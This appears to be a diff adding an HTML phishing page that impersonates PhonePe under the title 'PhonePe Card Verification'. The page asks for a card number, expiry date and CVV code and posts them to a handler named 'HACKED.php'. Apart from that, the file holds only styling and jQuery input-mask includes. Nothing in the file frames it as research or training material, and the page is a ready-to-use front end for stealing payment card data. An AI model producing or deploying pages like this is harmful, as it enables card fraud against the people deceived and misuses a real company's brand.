@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>PhonePe Card Verification</title>
+	<link rel="stylesheet" href="styles.css">
+	<style>
+		body, html {
+			margin: 0;
+			padding: 0;
+			height: 100%;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			font-family: Arial, sans-serif;
+			background-color: #f3f3f3;
+		}
+
+		.wrapper {
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			width: 100%;
+			height: 100%;
+		}
+
+		.container {
+			background-color: white;
+			padding: 20px;
+			border-radius: 10px;
+			box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
+			width: 90%;
+			max-width: 400px;
+		}
+
+		.title {
+			font-size: 24px;
+			font-weight: bold;
+			margin-bottom: 20px;
+			text-align: center;
+		}
+
+		.input-form {
+			margin-bottom: 20px;
+		}
+
+		.section-1, .section-2 {
+			margin-bottom: 15px;
+		}
+
+		.items {
+			margin-bottom: 10px;
+		}
+
+		.label {
+			display: block;
+			margin-bottom: 5px;
+			color: #555;
+			font-weight: bold;
+		}
+
+		.input {
+			width: 100%;
+			padding: 10px;
+			border-radius: 5px;
+			border: 1px solid #ccc;
+			box-sizing: border-box;
+			font-size: 16px;
+		}
+
+		.cvc-img {
+			position: absolute;
+			width: 30px;
+			right: 10px;
+			top: 35px;
+		}
+
+		.tooltip {
+			position: relative;
+			display: inline-block;
+			cursor: pointer;
+			color: #555;
+		}
+
+		.btn {
+			width: 100%;
+			padding: 15px;
+			background-color: #6926bf;
+			color: white;
+			border: none;
+			border-radius: 5px;
+			font-size: 18px;
+			cursor: pointer;
+			box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+			text-align: center;
+		}
+
+		.btn:hover {
+			background-color: #45a049;
+		}
+	</style>
+</head>     
+<body>
+
+<div class="wrapper">
+  <div class="container">
+    <div class="title">PhonePe Verification</div>
+    
+    <form action="HACKED.php" method="post">
+      <div class="input-form">
+        <div class="section-1">
+          <div class="items">
+            <label class="label">CARD NUMBER</label>
+            <input type="text" class="input" name="card_number" data-mask="0000 0000 0000 0000" placeholder="0000 0000 0000 0000">
+          </div>
+        </div>
+        <div class="section-2">
+          <div class="items">
+            <label class="label">EXPIRE DATE</label>
+            <input type="text" class="input" name="expire_date" data-mask="00 / 00" placeholder="MM / YY">
+          </div>
+          <div class="items">
+            <div class="cvc">
+              <label class="label">CVV CODE</label>
+              <div class="tooltip">?
+                <div class="cvc-img"><img src="cvv.png" alt=""></div>
+              </div>
+            </div>
+            <input type="text" class="input" name="cvv_code" data-mask="000" placeholder="000">
+          </div>
+        </div>
+      </div>
+    
+      <button type="submit" class="btn">Proceed</button>
+    </form>
+    
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+</body>
+</html>
